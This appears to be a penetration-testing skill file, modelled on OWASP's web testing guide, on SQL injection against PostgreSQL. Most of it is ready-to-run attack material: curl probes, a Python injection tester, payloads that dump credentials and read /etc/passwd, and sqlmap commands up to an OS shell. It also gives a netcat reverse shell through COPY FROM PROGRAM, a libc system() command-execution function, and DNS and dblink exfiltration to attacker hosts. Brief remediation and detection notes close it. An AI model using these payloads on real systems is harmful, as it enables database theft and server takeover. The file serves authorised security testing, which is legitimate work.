---
name: wstg-inpv-05.4
description: "Testing for SQL Injection - PostgreSQL"
category: input-validation
owasp_id: WSTG-INPV-05.4
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "PostgreSQL Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
---

# wstg-inpv-05.4

## Test ID

WSTG-INPV-05.4

## Test Name

Testing for SQL Injection - PostgreSQL

## High-Level Description

PostgreSQL-specific SQL injection testing exploits PostgreSQL's unique features including dollar-quoted strings, array operations, COPY command for file operations, and extension capabilities. PostgreSQL is common in modern web stacks and offers powerful features that can be exploited.

---

## What to Check

- [ ] PostgreSQL error messages
- [ ] String concatenation (||)
- [ ] Dollar-quoted strings
- [ ] COPY command file access
- [ ] Extension functions
- [ ] Large object operations

---

## How to Test

### Step 1: PostgreSQL Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for PostgreSQL database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "PostgreSQL|psql|Npgsql|PG::|pg_"

# PostgreSQL comment syntax
curl -s "${TARGET}1--"
curl -s "${TARGET}1/*comment*/"

# String concatenation (PostgreSQL uses ||)
curl -s "${TARGET}1'||'test"

# Version detection
curl -s "${TARGET}' UNION SELECT version()--"

# Cast error (PostgreSQL specific)
curl -s "${TARGET}1::int"
```

### Step 2: PostgreSQL SQLi Tester

```python
#!/usr/bin/env python3
"""
PostgreSQL SQL Injection Tester
"""

import requests
import re
import time

class PostgreSQLSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # PostgreSQL error patterns
    POSTGRESQL_ERRORS = [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR: parser: parse error",
        r"unterminated quoted string",
        r"pg_query\(\)",
        r"pg_exec\(\)",
    ]

    # PostgreSQL-specific payloads
    POSTGRESQL_PAYLOADS = {
        'error_based': [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND 1=CAST(version() AS int)--",
            "',CAST((SELECT version()) AS int))--",
            "'||(SELECT version())::int--",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,current_user,3--",
            "' UNION SELECT 1,current_database(),3--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
        ],
        'time_based': [
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
            "' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 1 END)--",
            "1; SELECT pg_sleep(5)--",
        ],
        'stacked': [
            "'; SELECT version()--",
            "'; CREATE TABLE test(id int)--",
        ],
        'file_operations': [
            "'; COPY (SELECT version()) TO '/tmp/output.txt'--",
            "' UNION SELECT pg_read_file('/etc/passwd')--",
        ],
    }

    def detect_postgresql(self, param):
        """Detect if backend is PostgreSQL"""
        print(f"[*] Detecting PostgreSQL database...")

        detection_payloads = [
            "' AND 1=1--",
            "' UNION SELECT version()--",
            "'||'test",
            "1::int",
        ]

        for payload in detection_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.POSTGRESQL_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] PostgreSQL database detected!")
                        return True

                if 'postgresql' in response.text.lower():
                    print(f"[+] PostgreSQL detected!")
                    return True

            except Exception as e:
                pass

        return False

    def test_error_based(self, param):
        """Test PostgreSQL error-based injection"""
        print(f"\n[*] Testing PostgreSQL error-based injection...")

        for payload in self.POSTGRESQL_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Look for version in error
                if re.search(r'PostgreSQL \d+\.\d+', response.text, re.IGNORECASE):
                    print(f"[VULN] Error-based SQLi!")
                    version = re.search(r'PostgreSQL \d+\.\d+[^\r\n]*', response.text)
                    if version:
                        print(f"  Version: {version.group()}")
                    self.findings.append({
                        'type': 'PostgreSQL Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param):
        """Test PostgreSQL time-based blind injection"""
        print(f"\n[*] Testing PostgreSQL time-based injection (pg_sleep)...")

        # Baseline
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.POSTGRESQL_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 4:
                    print(f"[VULN] Time-based SQLi (pg_sleep)!")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'PostgreSQL Time-based Blind SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'PostgreSQL Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_file_operations(self, param):
        """Test PostgreSQL file operations"""
        print(f"\n[*] Testing PostgreSQL file operations...")

        file_payloads = [
            "' UNION SELECT pg_read_file('/etc/passwd')--",
            "' UNION SELECT pg_read_file('/etc/passwd',0,1000)--",
        ]

        for payload in file_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                if 'root:' in response.text:
                    print(f"[VULN] File read via pg_read_file!")
                    self.findings.append({
                        'type': 'PostgreSQL File Read',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all PostgreSQL SQLi tests"""
        if self.detect_postgresql(param):
            self.test_error_based(param)
            self.test_time_based(param)
            self.test_file_operations(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("POSTGRESQL SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo PostgreSQL SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:70]}")

# Usage
tester = PostgreSQLSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: PostgreSQL Data Extraction

```sql
-- PostgreSQL Version
SELECT version()

-- Current User
SELECT current_user
SELECT user
SELECT session_user

-- Current Database
SELECT current_database()

-- List Databases
SELECT datname FROM pg_database

-- List Tables
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- List Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extract Data
SELECT username || ':' || password FROM users

-- Read Files (requires superuser or pg_read_server_files)
SELECT pg_read_file('/etc/passwd')
SELECT pg_read_file('/etc/passwd', 0, 1000)

-- Write Files (requires superuser or pg_write_server_files)
COPY (SELECT 'test') TO '/tmp/output.txt'

-- Command Execution (requires extension)
-- Load dblink extension: CREATE EXTENSION dblink;
-- Load pg_execute_server_program extension

-- Large Object for file operations
SELECT lo_import('/etc/passwd')
SELECT lo_get(loid) FROM pg_largeobject_metadata

-- DNS Exfiltration via dblink
SELECT * FROM dblink('host=attacker.com user=' || current_user || ' dbname=a', 'SELECT 1') RETURNS (i int)
```

---

## Tools

| Tool       | Purpose                   |
| ---------- | ------------------------- |
| SQLMap     | Automated PostgreSQL SQLi |
| psql       | PostgreSQL client         |
| pgAdmin    | GUI client                |
| Burp Suite | Manual testing            |

---

## Example Commands/Payloads

### Detection (curl)

```bash
TARGET="https://target.com/product"

# PostgreSQL-specific error trigger
curl -s "$TARGET?id=1'" | grep -Ei "PostgreSQL query failed|pg_query|syntax error at or near"

# Native time-based blind (pg_sleep)
time curl -s "$TARGET?id=1'; SELECT pg_sleep(5)--" -o /dev/null
time curl -s "$TARGET?id=1' AND (SELECT 1 FROM pg_sleep(5))-- -" -o /dev/null

# Version/user fingerprint via UNION
curl -s "$TARGET?id=1 UNION SELECT version(),current_user,NULL--"

# Cast-error based data extraction (forces value into error message)
curl -s "$TARGET?id=1 AND 1=CAST((SELECT current_user) AS int)--"
```

### SQLMap (PostgreSQL)

```bash
sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --banner
sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --dbs
sqlmap -u "https://target.com/product?id=1" --dbms=postgresql -D target_db -T users --dump
sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --file-read=/etc/passwd
sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --os-shell     # requires superuser + dblink/lo_import
```

### Command Execution via COPY TO/FROM PROGRAM (PostgreSQL >= 9.3)

Requires superuser or the `pg_execute_server_program` role — pipes query output to/from an OS process, no extension needed:

```sql
-- Blind OOB exfiltration (DNS callback carries current_user)
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker-collab.net'--

-- Reverse shell
'; CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'--
```

### Command Execution via libc.so.6 (fallback when COPY PROGRAM is restricted)

```sql
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT; SELECT system('id > /tmp/out; cat /tmp/out | nc attacker-ip 4444');--
```

### Full-Dump Exfiltration via query_to_xml (no LIMIT juggling)

Combine with the CAST error-based oracle to pull an entire result set in one shot instead of one row at a time:

```sql
' AND 1=CAST((SELECT query_to_xml('select * from pg_user',true,true,'')) AS int)--
```

### Dollar-Quote / CHR() WAF Bypass (no single quotes needed)

```sql
SELECT $$NoQuoteNeeded$$;
SELECT CHR(65)||CHR(66)||CHR(67);   -- builds 'ABC' without any quote character
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `PostgreSQL query failed` / `syntax error at or near` / `pg_query()` in response | Error-based SQLi, confirms PostgreSQL backend |
| Response delayed exactly N seconds for `pg_sleep(N)` | Time-based blind SQLi |
| `CAST(... AS int)` error message leaks the cast value (e.g. `invalid input syntax for integer: "postgres"`) | Error-based data exfiltration via type-cast errors |
| `dblink`/`pg_read_file` succeeds | Superuser or `pg_read_server_files` role — file read/RCE path available |
| DNS callback received from `COPY (...) TO PROGRAM 'nslookup ...'` | `pg_execute_server_program` role confirmed — command execution available without any extension |
| `query_to_xml()` returns a full table dump inside a single error/cast payload | Bulk exfiltration channel, avoids row-by-row `LIMIT`/`OFFSET` enumeration |

---

## Remediation

```python
# Python - psycopg2 parameterized queries
import psycopg2

cursor = connection.cursor()
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

```javascript
// Node.js - pg module
const { Pool } = require("pg")
const pool = new Pool()

pool.query("SELECT * FROM users WHERE id = $1", [userId])
```

---

## Risk Assessment

| Finding                        | CVSS | Severity |
| ------------------------------ | ---- | -------- |
| PostgreSQL SQLi with superuser | 9.8  | Critical |
| PostgreSQL file read           | 8.6  | High     |
| PostgreSQL Blind SQLi          | 8.6  | High     |

---

## CWE Categories

| CWE ID     | Title         |
| ---------- | ------------- |
| **CWE-89** | SQL Injection |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet - PostgreSQL](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection (PostgreSQL)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#postgresql)

---

## Checklist

```
[ ] PostgreSQL database detected
[ ] Error-based injection tested
[ ] Time-based injection tested
[ ] File operations tested
[ ] Extension functions tested
[ ] Findings documented
```
